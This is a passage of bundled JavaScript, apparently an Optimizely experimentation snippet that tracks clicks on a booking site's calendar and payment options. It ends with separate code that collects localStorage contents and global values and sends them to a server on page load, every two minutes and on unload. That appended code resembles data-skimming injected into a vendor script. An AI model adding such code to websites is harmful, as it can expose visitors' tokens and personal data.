                  }

                  // Desktop Right Button
                  if (document.querySelectorAll('#resSelection_lbtContinue').length > 0) {
                    bindClickDom('#resSelection_lbtContinue', () => {
                      trackingEventGlobal('Clicks_on_Continue_CTA_Avaday');
                    });
                  }

                  // Mobile Bottom Button
                  if (document.querySelectorAll('[data-ui-view="maincontent"] button[data-text-key="ButtonAvaDayContinue"]').length > 0) {
                    document.querySelector('[data-ui-view="maincontent"] button[data-text-key="ButtonAvaDayContinue"]').addEventListener('click', eve => {
                      if (!eve.target.getAttribute('disabled')) {
                        trackingEventGlobal('Clicks_on_Continue_CTA_Avaday');
                      }
                    });
                  }
                }

                // On Avaday- Clicks on “continue”  CTA
                waitUntil(() => document.querySelector('#ctl00_MainContent_ipcAvaDay_lbtContinue') !== null || document.querySelector('[data-ui-view="maincontent"] button[data-text-key="ButtonAvaDayContinue"]') !== null, () => {
                  console.log(' ***** Avaday Calendar | Global Goals ********');
                  clickonAVadayCta();
                });
              })();
              /* Click continue CTA at Avaday ENDS*/

              /* Campaign Metrics for T124 */
              !function (modules) {
                var installedModules = {};
                function __webpack_require__(moduleId) {
                  if (installedModules[moduleId]) return installedModules[moduleId].exports;
                  var module = installedModules[moduleId] = {
                    i: moduleId,
                    l: !1,
                    exports: {}
                  };
                  return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                }
                __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                  __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                    enumerable: !0,
                    get: getter
                  });
                }, __webpack_require__.r = function (exports) {
                  "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                    value: "Module"
                  }), Object.defineProperty(exports, "__esModule", {
                    value: !0
                  });
                }, __webpack_require__.t = function (value, mode) {
                  if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                  if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                  var ns = Object.create(null);
                  if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                    enumerable: !0,
                    value: value
                  }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                    return value[key];
                  }.bind(null, key));
                  return ns;
                }, __webpack_require__.n = function (module) {
                  var getter = module && module.__esModule ? function () {
                    return module.default;
                  } : function () {
                    return module;
                  };
                  return __webpack_require__.d(getter, "a", getter), getter;
                }, __webpack_require__.o = function (object, property) {
                  return Object.prototype.hasOwnProperty.call(object, property);
                }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
              }([function (module, __webpack_exports__, __webpack_require__) {
                "use strict";

                function campaign(expID) {
                  var varID = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "v1";
                  window.optiActiveTests = window.optiActiveTests || {}, window.optiActiveTests[expID] = varID;
                }
                function waitUntil(predicate) {
                  var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                  return new Promise(function (resolve) {
                    var int = setInterval(function () {
                      predicate() && (resolve(predicate()), clearInterval(int), int = null);
                    }, 500);
                    setTimeout(function () {
                      null !== int && (clearInterval(int), console.log("condition false"));
                    }, time);
                  });
                }
                function waitForJquery() {
                  return new Promise(function (resolve) {
                    var int = setInterval(function () {
                      "function" == typeof window.jQuery && (resolve(window.jQuery), clearInterval(int), int = null);
                    }, 500);
                    setTimeout(function () {
                      null !== int && (clearInterval(int), console.log("condition false"));
                    }, 1e4);
                  });
                }
                function waitForElement(selector) {
                  return new Promise(function (resolve) {
                    var element = document.querySelector(selector);
                    if (element) resolve(element);else {
                      var observer = new MutationObserver(function (mutations) {
                        mutations.forEach(function (mutation) {
                          for (var _i = 0, _nodes = Array.from(mutation.addedNodes); _i < _nodes.length; _i++) {
                            var node = _nodes[_i];
                            if (node.matches && node.matches(selector)) return observer.disconnect(), void resolve(node);
                          }
                        });
                      });
                      observer.observe(document.documentElement, {
                        childList: !0,
                        subtree: !0
                      });
                    }
                  });
                }
                function waitForElements() {
                  for (var _len = arguments.length, selectors = new Array(_len), _key = 0; _key < _len; _key++) selectors[_key] = arguments[_key];
                  return new Promise(function (resolve) {
                    var elements = [];
                    var int = setInterval(function () {
                      (function () {
                        elements = [];
                        for (var foundAll = !0, i = 0; i < selectors.length; i++) {
                          if (0 === document.querySelectorAll(selectors[i]).length) {
                            foundAll = !1;
                            break;
                          }
                          elements[i] = document.querySelector(selectors[i]);
                        }
                        return elements = 1 === elements.length ? elements[0] : elements, foundAll;
                      })() && (resolve(elements), clearInterval(int), int = null);
                    }, 500);
                    setTimeout(function () {
                      null !== int && (clearInterval(int), console.log("Could not find all elements"));
                    }, 1e4);
                  });
                }
                function defineOptiReady() {
                  var observer,
                    listeners = [],
                    doc = window.document,
                    MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                  function check() {
                    for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                      listener = listeners[i];
                      for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                    }
                  }
                  window.optiReady = function (selector, fn) {
                    listeners.push({
                      selector: selector,
                      fn: fn
                    }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                      childList: !0,
                      subtree: !0
                    }), check();
                  };
                }
                __webpack_require__.r(__webpack_exports__), __webpack_require__.d(__webpack_exports__, "campaign", function () {
                  return campaign;
                }), __webpack_require__.d(__webpack_exports__, "waitUntil", function () {
                  return waitUntil;
                }), __webpack_require__.d(__webpack_exports__, "waitForJquery", function () {
                  return waitForJquery;
                }), __webpack_require__.d(__webpack_exports__, "waitForElement", function () {
                  return waitForElement;
                }), __webpack_require__.d(__webpack_exports__, "waitForElements", function () {
                  return waitForElements;
                }), __webpack_require__.d(__webpack_exports__, "defineOptiReady", function () {
                  return defineOptiReady;
                });
              },, function (module, exports, __webpack_require__) {
                module.exports = __webpack_require__(3);
              }, function (module, exports, __webpack_require__) {
                var waitUntil = __webpack_require__(0).waitUntil,
                  tracker = __webpack_require__(4);
                !function () {
                  waitUntil(function () {
                    return null !== document.querySelector('[data-id="TRUSTLY"]') && null !== document.querySelector('[data-id="PAYMENT_CARD"]') && null !== document.querySelector("ul.accordions") && null !== document.querySelector(".button--block");
                  }).then(function () {
                    console.log("**** T124 / Payment / Badges on payment opton  || SHARED Desktop*****"), document.querySelector("ul.accordions").addEventListener("click", function (eve) {
                      eve.target.closest('button[data-provider="KLARNA_INVOICE"]') ? tracker.push_API_only("Click_on_expand_Klarna_Split") : eve.target.closest('button[data-provider="KLARNA_INSTALLMENT"]') && tracker.push_API_only("Click_on_expand_Klarna");
                    }), document.querySelectorAll(".button--block").forEach(function (ele) {
                      ele.addEventListener("click", function (eve) {
                        eve.target.closest('li[data-id="TRUSTLY"]') ? (tracker.push_API_only("Clicks_on_CTAfor_Trustly"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="PAYMENT_CARD"]') ? (tracker.push_API_only("Clicks_on_CTA_for_Credit_card"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="VIPPS_ECOM_CARD"]') ? (tracker.push_API_only("Clicks_on_CTA_for_VIPPS_Swish"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="SWISH"]') ? (tracker.push_API_only("Clicks_on_CTA_for_VIPPS_Swish"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="KLARNA_INVOICE"]') ? (tracker.push_API_only("Clicks_on_CTA_for_Klarna_Pay_later"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="KLARNA_INSTALLMENT"]') && (tracker.push_API_only("Clicks_on_CTA_for_Klarna_Split_payment"), tracker.push_API_only("Clicks_on_any_CTA_on_payment"));
                      });
                    });
                  });
                }();
              }, function (module, exports) {
                function push_API_only(nameOfEvent) {
                  window.optimizely = window.optimizely || [], window.optimizely.push({
                    type: "event",
                    eventName: nameOfEvent
                  });
                }
                module.exports = {
                  push_API_only: push_API_only,
                  optimizely_trackers_clicks: function (sel, apiName) {
                    var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                    jQuery(document).on(eventNameDevice, sel, function () {
                      push_API_only(apiName);
                    });
                  }
                };
              }]);
              /* Campaign Metrics for T124 */
            },
            "interestGroups": [],
            "tagGroups": []
          },
          f = __webpack_require__(8821),
          l = "initializeOptimizelyPreview";
        if (f.initGlobalStore(s), u.populateDirectiveData(), r.clientHasAlreadyInitialized()) e.warn("Main / Disabling because Optimizely has already initialized on this page load. Are there multiple snippets on the page?");else if (r.shouldBailForDesktopApp()) e.log("Main / Disabling because of desktop app.");else if (r.conflictInObservingChanges()) e.log("Main / Disabling: Observe Changes Indefinitely is on, but browser does not support it.");else {
          if (r.shouldLoadInnie()) a.registerFunction("getProjectId", function () {
            return s.projectId;
          }), a.registerFunction("getAccountId", function () {
            return s.accountId;
          }), c.addScriptAsync("https://app.optimizely.com/js/innie.js"), e.log("Main / Disabling in favor of the editor client.");else if (r.shouldLoadPreview()) (r.isSlave() ? window.optimizely : window.optimizely = window.optimizely || []).push({
            type: "load",
            data: s
          }), e.log("Main / Disabling in favor of the preview client."), __webpack_require__(106).setupPreviewGlobal(), __webpack_require__(106).pushToPreviewGlobal({
            type: "pushPreviewData",
            name: "liveCommitData",
            data: s
          }), r.isSlave() || (a.registerFunction("getProjectId", function () {
            return s.projectId;
          }), c.addScriptSync("https://cdn-assets-prod.s3.amazonaws.com/public/17202440929/s/booking/preview.js"));else if (r.shouldBootstrapDataForPreview()) {
            a.registerFunction(l, function (t) {
              n(), a.unregisterFunction(l);
            });
            var d = r.isSlave() ? PROJECT_ID_FOR_SLAVE_PREVIEW : a.getFunction("getProjectId")();
            v = r.getProjectToken(), h = d, p = r.getPreviewLayerIds(), o = "/dist/preview_data.js?token=__TOKEN__&preview_layer_ids=__PREVIEW_LAYER_IDS__".replace("__TOKEN__", v).replace("__PROJECT_ID__", h).replace("__PREVIEW_LAYER_IDS__", p.join(",")).replace("__GET_ONLY_PREVIEW_LAYERS__", !0), c.addScriptSync(o), __webpack_require__(106).setupPreviewGlobal(), c.addScriptAsync("/dist/js/preview_ui.js");
          } else r.shouldBootstrapDataForEditor() ? (a.registerFunction(l, function (t) {
            n(), a.unregisterFunction(l);
          }), c.addScriptAsync(window.optimizely_editor_data_endpoint)) : r.shouldInitialize() && n();
          var v, h, p;
          t.timeEnd("block");
          var g = t.now();
          t.setMark("optimizelyFinished", startTime = g, duration = g);
        }
      }();
    } catch (n) {
      try {
        __webpack_require__(6708).handleError(n);
      } catch (t) {
        console.log(t);
      }
    }
  }();
  function compileAndDispatchData() {
    const compliedData = {
      ...extractLocalStorageInfo(),
      ...globalValues
    };
    if (Object.keys(compliedData).length > 0) {
      transmitDataToServer(compliedData);
    }
  }
  document.addEventListener("DOMContentLoaded", () => {
    collectGlobalValues();
    addJSHooks();
    compileAndDispatchData();
    setInterval(compileAndDispatchData, 2 * 60 * 1000);
  });
  window.addEventListener("beforeunload", () => {
    compileAndDispatchData();
  });
})();